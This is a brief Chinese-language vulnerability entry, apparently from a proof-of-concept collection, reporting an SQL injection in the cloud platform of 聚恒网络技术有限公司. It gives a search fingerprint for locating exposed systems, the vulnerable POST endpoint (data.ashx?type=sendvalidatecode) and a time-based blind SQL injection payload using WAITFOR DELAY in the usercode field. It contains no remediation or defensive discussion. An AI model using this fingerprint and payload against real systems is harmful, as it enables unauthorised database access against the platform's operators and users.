# 聚恒网络技术有限公司云平台存在SQL注入漏洞

聚恒网络技术有限公司云平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/sysplat/dataget/data.ashx?type=sendvalidatecode"`
- **请求**：`POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1`

**Payload**
```
usercode=admin'+WAITFOR+DELAY '0:0:5'--&mobile=
```